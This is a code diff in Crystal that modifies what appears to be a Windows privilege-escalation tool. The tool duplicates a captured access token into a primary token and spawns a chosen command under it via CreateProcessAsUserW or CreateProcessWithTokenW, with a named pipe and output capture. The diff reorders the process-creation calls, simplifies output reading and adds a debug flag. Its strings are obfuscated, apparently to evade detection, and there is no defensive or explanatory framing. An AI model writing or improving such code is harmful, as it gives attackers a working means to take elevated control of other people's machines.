@@ -751,9 +751,6 @@ lib WinExtra
     lpStartAddress : Pointer(Void) -> UInt32, lpParameter : Void*,
     dwCreationFlags : UInt32, lpThreadId : UInt32*) : Void*
   fun VirtualProtect(lpAddress : Void*, dwSize : UInt64, flNewProtect : UInt32, lpflOldProtect : UInt32*) : Int32
-  fun GetStdHandle(nStdHandle : UInt32) : Void*
-  fun MultiByteToWideChar(codePage : UInt32, dwFlags : UInt32, lpMB : UInt8*, cbMB : Int32, lpWC : UInt16*, cchWC : Int32) : Int32
-  fun WriteConsoleW(hOut : Void*, lpBuf : UInt16*, nChars : UInt32, lpWritten : UInt32*, lpReserved : Void*) : Int32
 end
 
 lib LibGC
@@ -813,9 +810,10 @@ STATUS_INFO_LENGTH_MISMATCH        = 0xC0000004_u32
 STATUS_SUCCESS                     = 0x00000000_u32
 DUPLICATE_SAME_ACCESS              = 0x00000002_u32
 
-STARTF_USESTDHANDLES = 0x00000100_u32
-CREATE_NO_WINDOW     = 0x08000000_u32
-HANDLE_FLAG_INHERIT  = 0x00000001_u32
+STARTF_USESTDHANDLES      = 0x00000100_u32
+CREATE_NO_WINDOW          = 0x08000000_u32
+CREATE_UNICODE_ENVIRONMENT = 0x00000400_u32
+HANDLE_FLAG_INHERIT       = 0x00000001_u32
 
 SECURITY_IMPERSONATION  = 2_i32
 TOKEN_PRIMARY           = 1_i32
@@ -1418,12 +1416,12 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   stdout_read = Pointer(Void).null
   stdout_write = Pointer(Void).null
   if WinExtra.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
-      pointerof(sa).as(Pointer(Void)), 8196_u32) == 0
+      pointerof(sa).as(Pointer(Void)), 4096_u32) == 0
     dbg obf("[!] pipe err:") + LibC.GetLastError.to_s
     return
   end
 
-  WinExtra.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
+  WinExtra.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0_u32)
   WinExtra.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
 
   primary_token = Pointer(Void).null
@@ -1431,7 +1429,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   has_primary = SysState.nt_duplicate_token(
     token_handle, TOKEN_ELEVATION,
     pointerof(dup_oa).as(Pointer(Void)),
-    SECURITY_IMPERSONATION.to_u32, TOKEN_PRIMARY.to_u32,
+    0_u32, TOKEN_PRIMARY.to_u32,
     pointerof(primary_token)) >= 0
   primary_token = token_handle unless has_primary
 
@@ -1444,17 +1442,19 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   cmdline_w = command_line.to_utf16
   created = false
 
-  if SysState.create_process_with_token_w(
-      primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
-      CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
-      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
-    created = true
-  elsif SysState.create_process_as_user_w(
+  if SysState.create_process_as_user_w(
       primary_token, Pointer(UInt16).null, cmdline_w.to_unsafe,
       Pointer(Void).null, Pointer(Void).null, 1,
-      CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
+      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
       pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
     created = true
+    dbg obf("[*] via CPAU")
+  elsif SysState.create_process_with_token_w(
+      primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
+      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
+      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
+    created = true
+    dbg obf("[*] via CPWTW")
   end
 
   SysState.nt_close(primary_token) if has_primary
@@ -1465,25 +1465,16 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
     stdout_write = Pointer(Void).null
 
     buf = Bytes.new(4096)
-    bytes_avail = 0_u32
-
-    h_stdout = WinExtra.GetStdHandle(0xFFFFFFF5_u32)
-    wide_buf = Slice(UInt16).new(4096)
     loop do
-      break unless SysState.peek_named_pipe(
-        stdout_read, Pointer(UInt8).null, 0_u32,
-        Pointer(UInt32).null, pointerof(bytes_avail), Pointer(UInt32).null) != 0
-      if bytes_avail > 0
-        bytes_read = 0_u32
-        if LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)), 4096_u32,
-            pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null) != 0
-          wide_len = WinExtra.MultiByteToWideChar(1_u32, 0_u32, buf.to_unsafe, bytes_read.to_i32, wide_buf.to_unsafe, 4096)
-          if wide_len > 0
-            written = 0_u32
-            WinExtra.WriteConsoleW(h_stdout, wide_buf.to_unsafe, wide_len.to_u32, pointerof(written), Pointer(Void).null)
-          end
-        end
+      bytes_read = 0_u32
+      ret = LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)), 4096_u32,
+          pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null)
+      if ret == 0
+        break
       end
+      break if bytes_read == 0
+      STDOUT.write(buf[0, bytes_read])
+      STDOUT.flush
     end
 
     timeout = -1_i64
@@ -1907,11 +1898,17 @@ def main
   command = ""
   pipe_name = obf("Crystal")
 
+  dd_flag = obf("-dd")
+  if idx = ARGV.index(dd_flag)
+    Config.debug_level = 2
+    ARGV.delete_at(idx)
+  end
+
   OptionParser.parse do |parser|
     parser.banner = obf("Usage: main.exe [options]")
     parser.on(obf("-c CMD"), obf("--cmd=CMD"), obf("Command")) { |c| command = c }
     parser.on(obf("-p NAME"), obf("--pipe=NAME"), obf("Pipe name")) { |p| pipe_name = p }
-    parser.on(obf("-d"), obf("--debug"), obf("Debug")) { Config.debug_level = {Config.debug_level + 1, 2}.min }
+    parser.on(obf("-d"), obf("Debug")) { Config.debug_level = 1 }
     parser.on(obf("-h"), obf("--help"), obf("Help")) { puts parser; exit }
   end
 
